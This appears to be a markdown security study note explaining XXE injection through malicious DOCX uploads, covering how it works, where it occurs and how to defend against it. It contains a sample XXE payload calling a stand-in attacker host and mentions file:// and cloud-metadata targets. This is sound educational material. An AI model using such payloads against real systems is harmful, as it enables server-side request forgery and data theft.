---
title: XML External Entity (XXE)
draft: false
tags:
  - XML-External-Entity
  - XEE
  - Vulnerability
  - web
  - offensive-security
  - docx
  - SSRF
  - File-Upload
  - SOAP
  - REST
  - API
NeedsReview: true
---

# 🛡️ XML External Entity (XXE)


XML External Entity injection (XXE) is a **web security vulnerability** that allows an attacker to interfere with an application's processing of XML data.
  

> [!warning] Potential Impact
> XXE often enables attackers to:
> - View files on the application server's filesystem.
> - Interact with back-end or external systems accessible by the application.

In some cases, attackers can escalate an XXE attack to **compromise the underlying server** or other back-end infrastructure by leveraging the vulnerability to perform **Server-Side Request Forgery (SSRF)** attacks.

---
# XXE via Malicious DOCX Upload

## Overview
An attacker can weaponize a seemingly valid `.docx` file by inserting a **malicious XML External Entity (XXE)** into its internal XML files. When the server parses the uploaded document, it may trigger **outbound requests** or attempt to access sensitive files.

**XML Injection / XXE** usually happen **server-side** or in backend parsers.
- Example: Web services (SOAP, REST with XML payloads), config files, or any XML parser.

**Still seen today:**
- In legacy SOAP web services.
- In file uploads that rely on XML-based formats (`.docx`, `.svg`, `.odt`).
- In poorly configured custom XML parsers.

---

## How It Works
1. **DOCX Structure**
   - A `.docx` file is a ZIP archive containing multiple XML files (e.g., `word/document.xml`).
   - An attacker can edit one of these XML files to include a `<!DOCTYPE>` and malicious entity.

2. **Malicious Payload Example**
   ```xml
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com:8080"> ]>
   <p>&xxe;</p>
```

3. **Server-Side Trigger**
    - Employee uploads the DOCX (appears legitimate).
    - Server unzips and parses the embedded XML.
    - Insecure XML parser **resolves the entity**, leading to:
        - **Outbound HTTP/TCP requests** (SSRF).
        - **File disclosure** if entity references `file://`.
        - **Cloud metadata access** if referencing `http://169.254.169.254/`.

---

## Real-World Impact

- Document preview or conversion services (e.g., DOCX → PDF).
- Indexers or search engines parsing text from documents.
- Any third-party library using insecure XML parsing (e.g., Apache POI, LibreOffice).

---

## Defense

> [!tip] Mitigation
> 
> - **Disable DTDs and external entities** in XML parsers.
>     
> - Use hardened libraries (`defusedxml` in Python, safe configs in Java/.NET).
>     
> - Treat uploaded Office documents as **untrusted content**.
>     
> - Monitor and restrict **outbound traffic** from document processing services.
>     

---

## Summary

✅ If the server parses DOCX contents with an **insecure XML parser**, a hidden XXE payload will cause the **server itself** to initiate the connection (TCP SYN/HTTP request). This is how attackers exploit DOCX uploads for **blind SSRF and data exfiltration**.

✅ **Key difference in one line:**
- **DOM Injection/XSS** = _Client-side browser exploitation._
- **XML Injection/XXE** = _Server-side XML parser exploitation._

---
## 🔗 Resources

- 🌐 PortSwigger: [Web Security - XXE](https://portswigger.net/web-security/xxe) 
